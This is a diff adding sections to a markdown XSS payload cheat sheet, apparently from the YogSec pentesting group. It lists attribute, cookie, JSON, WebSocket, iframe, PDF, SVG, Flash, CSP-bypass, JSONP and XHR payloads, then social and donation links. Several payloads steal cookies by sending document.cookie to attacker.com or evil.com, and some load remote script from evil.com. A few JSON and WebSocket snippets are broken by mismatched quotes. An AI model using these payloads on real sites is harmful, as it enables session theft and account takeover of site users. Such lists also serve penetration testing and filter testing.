@@ -304,3 +304,483 @@ Here are **200+ Mutation XSS Payloads** designed to bypass filters and mutate in
 
 ---
 
+# Attribute-Based XSS Payloads
+
+### Common Attribute-Based XSS Payloads
+- `<img src=x onerror=alert(1)>`
+- `<input type="text" value="" onfocus=alert(1)>`
+- `<div onmouseover=alert(1)>Hover me</div>`
+- `<body onload=alert(1)>`
+- `<a href="javascript:alert(1)">Click me</a>`
+- `<marquee onstart=alert(1)>Scroll me</marquee>`
+- `<form action="javascript:alert(1)">Submit</form>`
+- `<video src="x" onerror=alert(1)></video>`
+- `<button onclick=alert(1)>Click me</button>`
+- `<link rel="stylesheet" href="javascript:alert(1)">`
+
+---
+
+# Cookie-Based XSS Payloads
+
+### Common Cookie-Based XSS Payloads
+- `<script>document.cookie="sessionid=abcd1234; path=/;"</script>`
+- `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
+- `<img src="x" onerror="document.cookie='xss=1';alert(document.cookie)">`
+- `<body onload="document.cookie='auth=admin'">`
+- `<script>document.write('<img src="http://attacker.com/?c='+escape(document.cookie)+'">')</script>`
+- `<script>new Image().src='https://attacker.com/log?cookie='+document.cookie;</script>`
+- `<iframe src="javascript:alert(document.cookie)"></iframe>`
+- `<svg/onload="alert(document.cookie)">`
+- `<input type="hidden" value="" onfocus="alert(document.cookie)">`
+- `<form action="javascript:alert(document.cookie)">Submit</form>`
+
+---
+
+# Post-Based XSS Payloads
+
+### Common Post-Based XSS Payloads
+- `username=<script>alert(1)</script>&password=1234`
+- `name=John&comment=<img src=x onerror=alert('XSS')>`
+- `email=test@example.com&feedback=<svg/onload=alert('XSS')>`
+- `message=<iframe src=javascript:alert('XSS')></iframe>`
+- `content=<a href="javascript:alert('XSS')">Click me</a>`
+- `data=<div onmouseover=alert('XSS')>Hover me</div>`
+- `search=<input type='text' value='' onfocus=alert('XSS')>`
+- `phone=<marquee onstart=alert('XSS')>Scroll me</marquee>`
+- `info=<form action="javascript:alert('XSS')">Submit</form>`
+- `location=<video src=x onerror=alert('XSS')></video>`
+
+---
+
+# JSON-Based XSS Payloads
+
+### Common JSON-Based XSS Payloads
+```json
+{
+  "username": "<script>alert('XSS')</script>",
+  "comment": "<img src=x onerror=alert('XSS')>",
+  "email": "test@example.com",
+  "feedback": "<svg/onload=alert('XSS')>",
+  "message": "<iframe src=javascript:alert('XSS')></iframe>",
+  "content": "<a href='javascript:alert('XSS')'>Click me</a>",
+  "data": "<div onmouseover=alert('XSS')>Hover me</div>",
+  "search": "<input type='text' value='' onfocus=alert('XSS')>",
+  "phone": "<marquee onstart=alert('XSS')>Scroll me</marquee>",
+  "info": "<form action='javascript:alert('XSS')'>Submit</form>",
+  "location": "<video src=x onerror=alert('XSS')></video>"
+}
+```
+
+---
+
+# WebSocket XSS Payloads
+
+### Common WebSocket XSS Payloads
+```javascript
+ws = new WebSocket('ws://victim.com/socket');
+ws.onopen = function() {
+    ws.send("<script>alert('XSS')</script>");
+};
+
+ws = new WebSocket('ws://victim.com/socket');
+ws.onmessage = function(event) {
+    eval(event.data); // Potential XSS if data is unsanitized
+};
+
+ws = new WebSocket('ws://victim.com/socket');
+ws.onopen = function() {
+    ws.send("{"key":"<img src=x onerror=alert('XSS')>")};
+};
+
+ws = new WebSocket('ws://victim.com/socket');
+ws.onopen = function() {
+    ws.send("{"payload":"<svg/onload=alert('XSS')>")};
+};
+
+ws = new WebSocket('ws://victim.com/socket');
+ws.onopen = function() {
+    ws.send("{"data":"<iframe src=javascript:alert('XSS')></iframe>")};
+};
+```
+
+---
+
+# Indirect XSS Payloads
+
+### Common Indirect XSS Payloads
+```html
+<a href="javascript:alert('XSS')">Click Me</a>
+
+<img src="http://attacker.com/evil.png" onerror="alert('XSS')">
+
+<input value="" onfocus="alert('XSS')">
+
+<iframe src="javascript:alert('XSS')"></iframe>
+
+<svg><script>alert('XSS')</script></svg>
+
+<body onload="alert('XSS')"></body>
+
+<object data="javascript:alert('XSS')"></object>
+
+<details open ontoggle="alert('XSS')"></details>
+
+<marquee onstart="alert('XSS')">XSS Test</marquee>
+
+<video src onerror="alert('XSS')"></video>
+```
+
+---
+
+# Iframe-Based XSS Payloads
+
+### Common Iframe-Based XSS Payloads
+```html
+<iframe src="javascript:alert('XSS')"></iframe>
+
+<iframe srcdoc="<script>alert('XSS')</script>"></iframe>
+
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="> </iframe>
+
+<iframe src="//evil.com/xss.html"></iframe>
+
+<iframe src="javascript:document.write('<img src=x onerror=alert(1)>')"></iframe>
+
+<iframe src="javascript:parent.location='javascript:alert(1)'"> </iframe>
+
+<iframe src="http://victim.com" onload="alert('XSS')"></iframe>
+
+<iframe src="about:blank" onload="this.contentWindow.document.write('<img src=x onerror=alert(1)>')"></iframe>
+
+<iframe src="javascript:alert(document.cookie)"></iframe>
+
+<iframe srcdoc="<svg/onload=alert('XSS')>"></iframe>
+```
+
+---
+
+# PDF-Based XSS Payloads
+
+### Common PDF-Based XSS Payloads
+```html
+%PDF-1.5
+1 0 obj
+<< /OpenAction 2 0 R >>
+endobj
+2 0 obj
+<< /S /JavaScript /JS (alert('XSS')) >>
+endobj
+xref
+0 3
+0000000000 65535 f 
+0000000010 00000 n 
+0000000079 00000 n 
+trailer
+<< /Root 1 0 R >>
+startxref
+118
+%%EOF
+
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /OpenAction 2 0 R >>
+endobj
+2 0 obj
+<< /S /JavaScript /JS (alert('PDF XSS')) >>
+endobj
+xref
+0 3
+0000000000 65535 f 
+0000000010 00000 n 
+0000000079 00000 n 
+trailer
+<< /Root 1 0 R >>
+startxref
+118
+%%EOF
+
+%PDF-1.3
+1 0 obj
+<< /Type /Catalog /OpenAction 2 0 R >>
+endobj
+2 0 obj
+<< /S /JavaScript /JS (alert(document.cookie)) >>
+endobj
+xref
+0 3
+0000000000 65535 f 
+0000000010 00000 n 
+0000000079 00000 n 
+trailer
+<< /Root 1 0 R >>
+startxref
+118
+%%EOF
+```
+
+---
+
+# SVG-Based XSS Payloads
+
+### Common SVG-Based XSS Payloads
+```html
+<svg xmlns="http://www.w3.org/2000/svg">
+<script>alert('XSS')</script>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
+
+<svg><g onload="alert('XSS')"></g></svg>
+
+<svg><a xlink:href="javascript:alert('XSS')">Click me</a></svg>
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <animate attributeName="x" from="0" to="1" onbegin="alert('XSS')"></animate>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject>
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert('XSS')</script>
+    </body>
+  </foreignObject>
+</svg>
+```
+
+---
+
+# Flash-Based XSS Payloads
+
+### Common Flash-Based XSS Payloads
+```html
+<embed src="http://vulnerable.com/xss.swf?alert('XSS')">
+
+<object data="http://vulnerable.com/xss.swf?alert('XSS')"></object>
+
+<object type="application/x-shockwave-flash" data="http://vulnerable.com/xss.swf">
+  <param name="movie" value="http://vulnerable.com/xss.swf?alert('XSS')">
+</object>
+
+<embed src="data:application/x-shockwave-flash;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="/>
+
+<object data="data:application/x-shockwave-flash;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=" type="application/x-shockwave-flash"></object>
+```
+
+---
+
+# AJAX XSS Payloads
+
+### Common AJAX XSS Payloads
+```javascript
+$.get("/vulnerable", {data: "<script>alert('XSS')</script>"});
+
+$.post("/vulnerable", {data: "<img src='x' onerror='alert(1)'>"});
+
+fetch('/vulnerable?data=<script>alert(1)</script>');
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "/vulnerable?data=<svg onload=alert('XSS')>");
+xhr.send();
+
+jQuery.ajax({
+  url: '/vulnerable',
+  data: { input: '<script>alert(1)</script>' }
+});
+```
+
+---
+
+# CSP Bypass XSS Payloads
+
+### Common CSP Bypass XSS Payloads
+```html
+<script src="//evil.com/xss.js"></script>
+
+<script>fetch('https://evil.com/?c='+document.cookie)</script>
+
+<script>eval('alert(1)')</script>
+
+<script src=data:application/javascript;base64,YWxlcnQoMSk=></script>
+
+<script>window['ale'+'rt'](1)</script>
+
+<img src=x onerror=eval('ale'+'rt(1)')>
+
+<script>setTimeout('alert(1)',0)</script>
+
+<svg><script>alert`1`</script></svg>
+
+<a href="javascript:alert(1)">Click me</a>
+
+<iframe src="javascript:alert('XSS')"></iframe>
+```
+
+---
+
+# Canonical XSS Payloads
+
+### Common Canonical XSS Payloads
+```html
+<script>alert(1)</script>
+
+<img src=x onerror=alert(1)>
+
+<svg><script>alert(1)</script></svg>
+
+<iframe src="javascript:alert('XSS')"></iframe>
+
+<body onload=alert('XSS')>
+
+<video><source onerror="alert('XSS')"></video>
+
+<object data="javascript:alert('XSS')"></object>
+
+<a href="javascript:alert(1)">Click me</a>
+
+<marquee onstart=alert('XSS')></marquee>
+
+<div style="animation-name:rotation" onanimationstart="alert('XSS')"></div>
+```
+
+---
+
+# Event Handler XSS Payloads
+
+### Common Event Handler XSS Payloads
+```html
+<button onclick="alert('XSS')">Click Me</button>
+
+<img src=x onerror=alert(1)>
+
+<body onload=alert('XSS')>
+
+<marquee onstart=alert('XSS')></marquee>
+
+<div onmouseover="alert('XSS')">Hover me</div>
+
+<input type="text" value="Test" onfocus="alert('XSS')">
+
+<a href="#" onmousedown="alert('XSS')">Down</a>
+
+<form action="#" onsubmit="alert('XSS')">
+
+<video><source onerror="alert('XSS')"></video>
+
+<object data="javascript:alert('XSS')"></object>
+```
+
+---
+
+# JSONP XSS Payloads
+
+### Common JSONP XSS Payloads
+```html
+<script src="https://example.com/jsonp?callback=alert(1)"></script>
+
+<script src="https://example.com/api?callback=console.log&data=<img src=x onerror=alert(1)>"></script>
+
+<script src="https://example.com/?jsonp=alert(document.cookie)"></script>
+
+<script>$.getScript('https://example.com/callback?data=<svg onload=alert(1)>')</script>
+
+<script src="https://example.com/jsonp?callback=alert&data=<img src=x onerror=alert('XSS')>"></script>
+
+<script src="https://example.com/api?cb=alert('XSS')"></script>
+
+<script src="https://example.com/api?callback=alert&xss=<script>alert(1)<\/script>"></script>
+
+<script src="https://example.com/jsonp?callback=fetch('https://attacker.com/?cookie='+document.cookie)"></script>
+
+<script src="https://example.com/?callback=alert(document.domain)"></script>
+
+<script src="https://example.com/api?jsonp=alert(1)"></script>
+```
+
+---
+
+# XHR-Based XSS Payloads
+
+### Common XHR-Based XSS Payloads
+```html
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://example.com/api?data=<img src=x onerror=alert(1)>', true);
+  xhr.send();
+</script>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', 'https://example.com/login', true);
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send('username=admin&password=<script>alert(1)</script>');
+</script>
+
+<script>
+  fetch('https://example.com/api?data=<svg onload=alert(1)>')
+    .then(response => response.text())
+    .then(data => document.write(data));
+</script>
+
+<script>
+  $.get('https://example.com/api?data=<img src=x onerror=alert(1)>');
+</script>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://example.com/api?data='+encodeURIComponent("<script>alert('XSS')<\/script>"), true);
+  xhr.send();
+</script>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', '/search?q=<img src=x onerror=alert(1)>', true);
+  xhr.send();
+</script>
+
+<script>
+  fetch('/api?callback=alert(1)')
+    .then(response => response.text())
+    .then(eval);
+</script>
+
+<script>
+  $.ajax({
+    url: 'https://example.com/api?data=<script>alert(1)</script>',
+    success: function(data) {
+      document.write(data);
+    }
+  });
+</script>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://example.com/api?query=<img src=x onerror=alert(1)>', true);
+  xhr.send();
+</script>
+
+<script>
+  $.getJSON('https://example.com/api?callback=alert&data=<img src=x onerror=alert(1)>');
+</script>
+```
+
+---
+
+## 🌟 Let's Connect!
+
+Hello, Hacker! 👋 We'd love to stay connected with you. Reach out to us on any of these platforms and let's build something amazing together:
+
+🌐 **Website:** [https://yogsec.github.io/yogsec/](https://yogsec.github.io/yogsec/)  
+📜 **Linktree:** [https://linktr.ee/yogsec](https://linktr.ee/yogsec)  
+🔗 **GitHub:** [https://github.com/yogsec](https://github.com/yogsec)  
+💼 **LinkedIn (Company):** [https://www.linkedin.com/company/yogsec/](https://www.linkedin.com/company/yogsec/)  
+📷 **Instagram:** [https://www.instagram.com/yogsec.io/](https://www.instagram.com/yogsec.io/)  
+🐦 **Twitter (X):** [https://x.com/yogsec](https://x.com/yogsec)  
+👨‍💼 **Personal LinkedIn:** [https://www.linkedin.com/in/cybersecurity-pentester/](https://www.linkedin.com/in/cybersecurity-pentester/)  
+📧 **Email:** abhinavsingwal@gmail.com
+
+## ☕ Buy Me a Coffee
+
+If you find our work helpful and would like to support us, consider buying us a coffee. Your support keeps us motivated and helps us create more awesome content. ❤️
+
+☕ **Support Us Here:** [https://buymeacoffee.com/yogsec](https://buymeacoffee.com/yogsec)
+
